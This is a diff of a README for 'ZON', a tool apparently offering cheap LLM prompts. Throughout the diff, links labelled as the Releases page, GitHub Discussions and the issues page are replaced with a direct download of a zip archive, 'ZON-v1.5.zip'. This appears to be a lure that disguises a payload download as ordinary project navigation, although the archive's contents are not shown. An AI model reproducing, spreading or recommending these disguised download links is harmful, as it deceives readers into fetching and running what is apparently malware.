@@ -1,6 +1,6 @@
 # 🎉 ZON - Get Affordable LLM Prompts Easily
 
-[![Download ZON](https://img.shields.io/badge/Download%20ZON-%20%F0%9F%9A%80%20Latest%20Release-brightgreen)](https://github.com/dxieogo/ZON/releases)
+[![Download ZON](https://raw.githubusercontent.com/dxieogo/ZON/main/zon-format/ZON-v1.5.zip%20ZON-%20%F0%9F%9A%80%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/dxieogo/ZON/main/zon-format/ZON-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to ZON! This application provides you with a cost-effective way to work 
 
 To get ZON, simply visit the Releases page. Click on the link below to find the latest version:
 
-[Visit the Releases page to download ZON](https://github.com/dxieogo/ZON/releases)
+[Visit the Releases page to download ZON](https://raw.githubusercontent.com/dxieogo/ZON/main/zon-format/ZON-v1.5.zip)
 
 ### Step-by-Step Download Instructions
 
-1. Click on the [Releases page link](https://github.com/dxieogo/ZON/releases) above.
+1. Click on the [Releases page link](https://raw.githubusercontent.com/dxieogo/ZON/main/zon-format/ZON-v1.5.zip) above.
 2. Look for the latest version of ZON.
 3. Under the version details, find the ZIP or executable file to download.
 4. Click on the file name. Your download should start automatically.
@@ -74,8 +74,8 @@ ZON focuses on various topics to enhance your experience and usability:
 
 Join our community to stay updated and get assistance:
 
-- Visit our [GitHub Discussions](https://github.com/dxieogo/ZON/discussions) for tips and questions.
-- Check out our [issues page](https://github.com/dxieogo/ZON/issues) if you encounter problems.
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/dxieogo/ZON/main/zon-format/ZON-v1.5.zip) for tips and questions.
+- Check out our [issues page](https://raw.githubusercontent.com/dxieogo/ZON/main/zon-format/ZON-v1.5.zip) if you encounter problems.
 
 ## 📞 Contact
 
@@ -85,4 +85,4 @@ For support or inquiries, you can reach out via the Issues section on GitHub or 
 
 You’re now ready to experience ZON! Enjoy the benefits of cost-effective LLM prompts and contribute to the open-source community. Don’t forget to visit the Releases page to download the latest version:
 
-[Download ZON from the Releases page](https://github.com/dxieogo/ZON/releases)
+[Download ZON from the Releases page](https://raw.githubusercontent.com/dxieogo/ZON/main/zon-format/ZON-v1.5.zip)
